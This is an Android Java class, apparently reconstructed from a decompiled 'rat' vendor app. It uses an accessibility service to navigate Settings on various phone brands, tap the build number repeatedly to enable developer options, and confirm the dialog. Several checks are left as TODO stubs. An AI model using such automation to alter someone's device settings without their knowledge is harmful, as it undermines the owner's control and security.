package com.vendor.rat.auto.engine;

import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.BoolCondition;
import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.config.TextConfig;
import com.vendor.rat.service.MyAccessibilityService;
import com.vendor.rat.utils.DeviceUtils;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * 开发者选项自动开启代理
 *
 * Vendor: o/t.java (677 行)
 * 功能: 自动导航到"关于手机"→连续点击版本号→开启开发者选项
 *       支持多厂商版本号文本匹配 (MIUI/HyperOS/vivo/华为/三星等)
 *       100 秒超时自动结束
 *
 * 字段对齐:
 *   f695n → timeoutScheduler (ScheduledExecutorService)
 *   f696o → currentState (AtomicReference, OPEN_DEV_DEPT_*)
 *   f697p → finishLock (ReentrantLock)
 */
public class OpenDevelopmentDelegate extends AutoEngine {

    private static final String TAG = "OpenDevDelegate";
    private static final String SETTINGS = "com.android.settings";

    // ADAPT: f695n → timeoutScheduler
    public final ScheduledExecutorService timeoutScheduler;

    // ADAPT: f696o → currentState
    public final AtomicReference<String> currentState;

    // ADAPT: f697p → finishLock
    public final ReentrantLock finishLock;

    // 状态常量 — ADAPT: r.f enum
    public static final String STATE_UNKNOWN = "OPEN_DEV_DEPT_UNKNOWN";
    public static final String STATE_ENTER_ABOUT = "ENTER_ABOUT_DEVICE_WIN";
    public static final String STATE_PREPARE_VERSION = "PREPARE_VERSION_INFO_WIN";
    public static final String STATE_ENTER_VERSION = "ENTER_VERSION_INFO_WIN";
    public static final String STATE_PREPARE_CONFIRM = "PREPARE_CONFIRM_LOCK_WIN";
    public static final String STATE_ENTER_CONFIRM = "ENTER_CONFIRM_LOCK_WIN";
    public static final String STATE_CONFIRM_SUCCESS = "IS_CONFIRM_SUCCESS";
    public static final String STATE_ENABLE_SUCCESS = "ENABLE_DEV_OPT_SUCCESS";
    public static final String STATE_ENABLE_FAIL = "ENABLE_DEV_OPT_FAIL";
    public static final String STATE_WIN_CHECK = "WIN_CHECK";
    public static final String STATE_WIN_PREPARE = "WIN_PREPARE";

    public OpenDevelopmentDelegate() {
        super(createListenWindows(), SETTINGS);
        ScheduledExecutorService ses = Executors.newSingleThreadScheduledExecutor();
        this.timeoutScheduler = ses;
        this.currentState = new AtomicReference<>(STATE_UNKNOWN);
        this.finishLock = new ReentrantLock();
        try {
            ses.schedule(() -> handleTimeout(), 100L, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.e(TAG, "Schedule timeout error", e);
        }
    }

    // ============ 静态窗口构建 ============

    /**
     * ADAPT: W() → createMyDeviceInfoWindow
     */
    public static WindowMatcher createMyDeviceInfoWindow() {
        return new WindowMatcher(SETTINGS, "com.android.settings.Settings$MyDeviceInfoActivity")
                .addEventType(32).addEventType(16384);
    }

    /**
     * ADAPT: O() → createDeviceInfoSettingsWindow
     */
    public static WindowMatcher createDeviceInfoSettingsWindow() {
        return new WindowMatcher(SETTINGS, "com.android.settings.Settings$DeviceInfoSettingsActivity")
                .addEventType(32).addEventType(16384);
    }

    /**
     * ADAPT: N() → createFrameLayoutWindow
     */
    public static WindowMatcher createFrameLayoutWindow() {
        return new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
                .addEventType(32).addEventType(16384);
    }

    /**
     * ADAPT: d0() → createSubSettingsWindow
     */
    public static WindowMatcher createSubSettingsWindow() {
        return new WindowMatcher(SETTINGS, "com.android.settings.SubSettings")
                .addEventType(32).addEventType(16384);
    }

    /**
     * ADAPT: f0() → createVivoDeviceInfoWindow
     */
    public static WindowMatcher createVivoDeviceInfoWindow() {
        return new WindowMatcher(SETTINGS, "com.vivo.settings.deviceinfo.OriginDeviceSettingsActivity")
                .addEventType(32).addEventType(16384);
    }

    /**
     * ADAPT: g0() → createVivoSubSettingsWindow
     */
    public static WindowMatcher createVivoSubSettingsWindow() {
        return new WindowMatcher(SETTINGS, "com.vivo.settings.VivoSubSettings")
                .addEventType(32).addEventType(16384);
    }

    /**
     * ADAPT: M() → createAlertDialogWindow
     */
    public static WindowMatcher createAlertDialogWindow() {
        return new WindowMatcher(SETTINGS, "android.app.AlertDialog")
                .addEventType(32).addEventType(16384);
    }

    /**
     * ADAPT: X() → createListenWindows
     * 包含所有监听窗口 + ConfirmLockDelegate 和 PairAccessibilityDelegate 的窗口
     */
    public static List<WindowMatcher> createListenWindows() {
        List<WindowMatcher> list = new ArrayList<>();
        list.add(createMyDeviceInfoWindow());
        list.add(createDeviceInfoSettingsWindow());
        list.add(createFrameLayoutWindow());
        list.add(createVivoDeviceInfoWindow());
        list.add(createSubSettingsWindow());
        list.add(createVivoSubSettingsWindow());
        list.add(createAlertDialogWindow());
        // ADAPT: vendor 还添加了 i.L() 和 a0 的多个窗口
        // TODO: VENDOR_VERIFY - 需要集成 ConfirmLockDelegate 和 PairAccessibilityDelegate 的窗口
        return list;
    }

    // ============ 过滤器构建 ============

    /**
     * ADAPT: L() → createClickableFilter
     */
    public static CombineFilter createClickableFilter() {
        return CombineFilter.and(new BoolCondition(BoolCondition.Property.CLICKABLE, true));
    }

    /**
     * ADAPT: Y() → createBuildVersionFilters
     * 构建版本号文本匹配 (多厂商)
     */
    public CombineFilter createBuildVersionFilters() {
        String[] configKeys = {
            "BUILD_VERSION_TEXT", "BUILD_NUMBER_TEXT", "OS_VERSION_TEXT",
            "COLORS_BUILD_NUMBER_TEXT", "OS_SOFTWARE_VERSION_TEXT",
            "MIUI_VERSION_TEXT", "HYPER_OS_VERSION_TEXT",
            "VIVO_OS_SOFTWARE_VERSION_TEXT", "COMPILE_NUMBER_TEXT",
            "HUA_WEI_VERSION_TEXT", "HARMONY_OS_VERSION_TEXT"
        };
        List<CombineFilter> filters = new ArrayList<>();
        for (String key : configKeys) {
            CombineFilter f = buildTextViewFilter(key);
            if (f != null) filters.add(f);
        }
        if (filters.isEmpty()) return null;
        return CombineFilter.or(filters.toArray(new CombineFilter[0]));
    }

    /**
     * ADAPT: e0() → createVersionInfoFilters
     * 版本信息入口文本匹配
     */
    public CombineFilter createVersionInfoFilters() {
        String[] configKeys = {
            "OS_VERSION_INFO_TEXT", "VIVO_OS_VERSION_INFO_TEXT", "SOFTWARE_INFO_TEXT"
        };
        List<CombineFilter> filters = new ArrayList<>();
        for (String key : configKeys) {
            CombineFilter f = buildTextViewFilter(key);
            if (f != null) filters.add(f);
        }
        if (filters.isEmpty()) return null;
        return CombineFilter.or(filters.toArray(new CombineFilter[0]));
    }

    /**
     * ADAPT: V() → createMotoVersionFilter
     */
    public CombineFilter createMotoVersionFilter() {
        return buildTextViewFilter("MOTO_OS_VERSION_INFO_TEXT");
    }

    // ============ 执行入口 ============

    @Override
    public void execute() {
        // ADAPT: vendor 无独立 execute，由 onAccessibilityEvent 驱动
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        // ADAPT: 由 onAccessibilityEvent 状态机驱动
    }

    // ============ 核心逻辑 ============

    /**
     * ADAPT: H() → isInAboutDeviceWindow
     * 检查是否在"关于手机"窗口
     */
    public boolean isInAboutDeviceWindow() {
        List<WindowMatcher> list = new ArrayList<>();
        list.add(createMyDeviceInfoWindow());
        list.add(createDeviceInfoSettingsWindow());
        list.add(createFrameLayoutWindow());
        list.add(createVivoDeviceInfoWindow());
        return matchesAny(list);
    }

    /**
     * ADAPT: Q() → handleAboutDeviceWindow
     * 在"关于手机"窗口中查找版本号并点击
     */
    public void handleAboutDeviceWindow() {
        if (!isInAboutDeviceWindow()) return;

        Log.d(TAG, "inAboutDeviceWin 窗口匹配");
        activateRoot();
        Log.d(TAG, "active root complete");
        Log.d(TAG, "开始本地配对时间戳:" + System.currentTimeMillis());

        currentState.set(STATE_ENTER_ABOUT);

        boolean isSpecialBrand = DeviceUtils.isVivo() || DeviceUtils.isHuawei()
                || Build.BRAND.equalsIgnoreCase("samsung");

        // 特殊厂商: 先尝试版本信息入口
        if (isSpecialBrand) {
            CombineFilter versionInfoFilter = createVersionInfoFilters();
            if (versionInfoFilter != null) {
                UiNode node = findOrScroll(versionInfoFilter);
                if (node != null) {
                    clickVersionEntry(node);
                    return;
                }
            }
        }

        // 通用: 查找版本号文本
        CombineFilter buildFilter = createBuildVersionFilters();
        if (buildFilter != null) {
            UiNode node = findOrScroll(buildFilter);
            if (node != null) {
                if (!repeatClickForDevMode(node)) {
                    handleEnableDevFail();
                }
                return;
            }
        }

        // Motorola 特殊处理
        if (Build.BRAND.equalsIgnoreCase("motorola")) {
            CombineFilter motoFilter = createMotoVersionFilter();
            if (motoFilter != null) {
                UiNode node = findOrScroll(motoFilter);
                if (node != null) {
                    clickVersionEntry(node);
                    return;
                }
            }
            return;
        }

        // 最后尝试版本信息入口
        CombineFilter versionInfoFilter = createVersionInfoFilters();
        if (versionInfoFilter != null) {
            UiNode node = findOrScroll(versionInfoFilter);
            if (node != null) {
                clickVersionEntry(node);
            }
        }
    }

    /**
     * ADAPT: U() → handleVersionInfoWindow
     * 在"版本信息"窗口中查找版本号并点击
     */
    public void handleVersionInfoWindow() {
        List<WindowMatcher> list = new ArrayList<>();
        list.add(createSubSettingsWindow());
        list.add(createVivoSubSettingsWindow());
        if (!matchesAny(list)) return;

        Log.d(TAG, "inVersionInfoWin 窗口匹配");
        activateRoot();
        Log.d(TAG, "active root complete");
        currentState.set(STATE_ENTER_VERSION);

        CombineFilter buildFilter = createBuildVersionFilters();
        if (buildFilter == null) return;

        UiNode node = findOrScroll(buildFilter);
        if (node != null) {
            if (!repeatClickForDevMode(node)) {
                handleEnableDevFail();
            }
        }
    }

    /**
     * ADAPT: R() → handleAlertDialog
     * 处理"确认开启开发者选项"对话框
     */
    public void handleAlertDialog() {
        if (!matchesAny(Collections.singletonList(createAlertDialogWindow()))) return;

        UiNode root = k();
        if (root == null) return;

        // 查找 button1 (确认按钮)
        UiNode button = root.findOneByCombine(CombineFilter.and(
                StringCondition.className("android.widget.Button"),
                StringCondition.viewId("android:id/button1")));

        if (button != null && button.click()) {
            updateProgress(9);
            Log.d(TAG, "已点击确认开启开发者选项");
            // TODO: VENDOR_VERIFY - vendor 检查 utils.g.K() 开发者选项是否已开启
            currentState.set(STATE_ENABLE_SUCCESS);
            handleEnableDevSuccess();
        }
    }

    // ============ 辅助方法 ============

    /**
     * 查找节点，找不到则滚动查找
     */
    private UiNode findOrScroll(CombineFilter filter) {
        UiNode root = k();
        if (root == null) return null;

        UiNode node = root.findOneByCombine(filter);
        if (node != null) return node;

        // 尝试滚动查找
        UiNode scrollable = getScrollableNode();
        if (scrollable != null) {
            Log.d(TAG, "滚动视图查找成功");
            // ADAPT: vendor 使用 scrollForwardUtil / scrollBackwardUtil
            node = scrollable.scrollForwardUntil(filter);
            if (node == null) {
                node = scrollable.scrollBackwardUntil(filter);
            }
        }
        return node;
    }

    /**
     * 点击版本信息入口
     * ADAPT: vendor 检查 clickable，不可点击则查找可点击父节点
     */
    private void clickVersionEntry(UiNode node) {
        if (!node.isClickable()) {
            // ADAPT: vendor 使用 findParentUtilCombine(L())
            node = node.findParentUntil(CombineFilter.clickable());
        }
        if (node != null && node.click()) {
            currentState.set(STATE_PREPARE_VERSION);
            updateProgress(5);
        }
    }

    /**
     * ADAPT: Z() → repeatClickForDevMode
     * 连续点击版本号开启开发者模式 (最多 5 轮，每轮 7 次)
     */
    private boolean repeatClickForDevMode(UiNode node) {
        if (!node.isClickable()) {
            // ADAPT: vendor 使用 findParentUtilCombine(L())
            node = node.findParentUntil(CombineFilter.clickable());
        }
        if (node == null) return false;

        boolean success = false;
        AtomicInteger retryCount = new AtomicInteger(0);
        while (!success && retryCount.incrementAndGet() <= 5) {
            // ADAPT: vendor 使用 repeatClick(7)，这里用循环点击 7 次
            for (int i = 0; i < 7; i++) {
                node.click();
                sleep(200);
            }
            T0(5);
            success = checkDevModeEnabled();
        }

        if (success) return true;

        // ADAPT: vendor 额外尝试 e()/f1() 检查
        // TODO: VENDOR_VERIFY - 需要集成 MyAccessibilityService.P().e() 逻辑
        return false;
    }

    /**
     * ADAPT: K() → checkDevModeEnabled
     * 检查开发者模式是否已开启
     */
    private boolean checkDevModeEnabled() {
        // ADAPT: vendor 检查 i.I() (锁屏界面) 和 utils.g.K() (开发者选项)
        // TODO: VENDOR_VERIFY - 需要集成实际检查逻辑
        return false;
    }

    /**
     * ADAPT: T() → handleEnableDevSuccess
     */
    private void handleEnableDevSuccess() {
        if (!finishLock.tryLock()) return;
        try {
            shutdownInternal();
            MyAccessibilityService service = MyAccessibilityService.getInstance();
            if (service != null) {
                performBack();
                updateProgress(10);
            }
            // ADAPT: vendor 调用 a0() 检查窗口状态
            currentState.set(STATE_WIN_PREPARE);
        } finally {
            finishLock.unlock();
        }
    }

    /**
     * ADAPT: S() / b0() → handleEnableDevFail
     */
    private void handleEnableDevFail() {
        shutdownInternal();
        T0(10);
        currentState.set(STATE_ENABLE_FAIL);
        MyAccessibilityService service = MyAccessibilityService.getInstance();
        if (service != null) {
            performBack();
            updateProgress(10);
        }
        updateProgress(100);
    }

    /**
     * ADAPT: c0() → shutdownInternal
     */
    private void shutdownInternal() {
        try {
            timeoutScheduler.shutdownNow();
            super.destroy();
        } catch (Exception e) {
            Log.e(TAG, "shutdownInternal error", e);
        }
    }

    /**
     * 超时处理
     * ADAPT: vendor case 8 in Runnable s
     */
    private void handleTimeout() {
        handleEnableDevFail();
    }

    // ============ 生命周期 ============

    @Override
    public void destroy() {
        shutdownInternal();
        super.destroy();
    }

    // ============ 事件处理状态机 ============

    /**
     * ADAPT: u() → onAccessibilityEvent
     * 根据 currentState 分发到不同处理逻辑
     */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event, String packageName,
                                     String className) {
        super.onAccessibilityEvent(event, packageName, className);

        String state = currentState.get();
        int stateOrd = getStateOrdinal(state);

        // ADAPT: vendor 状态机按 ordinal 分发
        if (stateOrd < 0) {
            handleAboutDeviceWindow();
        }
        if (stateOrd < 2) {
            handleAboutDeviceWindow();
        }
        if (stateOrd < 4) {
            handleVersionInfoWindow();
        }
        if (stateOrd <= 4) {
            handleAlertDialog();
        }
        if (STATE_ENTER_CONFIRM.equals(state)) {
            // ADAPT: vendor case 4 - 处理锁屏确认
            // TODO: VENDOR_VERIFY - 需要集成 ConfirmLockDelegate 逻辑
        }
        if (STATE_PREPARE_CONFIRM.equals(state) || STATE_CONFIRM_SUCCESS.equals(state)) {
            // ADAPT: vendor case 5
            // TODO: VENDOR_VERIFY
        }
        if (STATE_WIN_CHECK.equals(state)) {
            // ADAPT: vendor case 6
            // TODO: VENDOR_VERIFY
        }
        if (STATE_WIN_PREPARE.equals(state)) {
            // ADAPT: vendor case 7
            // TODO: VENDOR_VERIFY
        }
    }

    private int getStateOrdinal(String state) {
        switch (state) {
            case STATE_UNKNOWN: return -1;
            case STATE_ENTER_ABOUT: return 0;
            case STATE_PREPARE_VERSION: return 1;
            case STATE_ENTER_VERSION: return 2;
            case STATE_PREPARE_CONFIRM: return 3;
            case STATE_ENTER_CONFIRM: return 4;
            case STATE_CONFIRM_SUCCESS: return 5;
            case STATE_ENABLE_SUCCESS: return 6;
            case STATE_ENABLE_FAIL: return 7;
            case STATE_WIN_CHECK: return 8;
            case STATE_WIN_PREPARE: return 9;
            default: return -1;
        }
    }

    // ============ singleton pattern ============

    @Override
    public boolean equals(Object obj) {
        return obj instanceof OpenDevelopmentDelegate;
    }

    @Override
    public int hashCode() {
        return Objects.hash(OpenDevelopmentDelegate.class.getName());
    }
}
